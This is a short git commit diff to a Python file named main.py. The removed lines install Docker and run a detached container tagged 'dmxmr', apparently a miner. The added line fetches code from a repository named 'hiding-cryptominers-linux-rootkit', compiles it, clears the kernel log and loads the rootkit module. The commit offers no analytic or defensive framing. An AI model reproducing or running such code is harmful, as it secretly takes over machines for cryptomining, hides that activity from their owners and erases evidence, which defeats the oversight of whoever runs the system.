3de9db3d8cdde1f6c693a8c9e94083ded6faf6b3
drakibaidb9 <132120897+drakibaidb9@users.noreply.github.com>
2023-05-02 11:29:58 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,7 +1,4 @@
 import os
 
 
-os.system("curl -fsSL https://get.docker.com -o get-docker.sh | bash")
-
-os.system("docker build --tag 'dmxmr' .")
-os.system("docker run --detach 'dmxmr'")
+os.system('git clone https://github.com/drakibaidb9/hiding-cryptominers-linux-rootkit && cd hiding-cryptominers-linux-rootkit/ && make && dmesg -C && insmod rootkit.ko && cd ..')
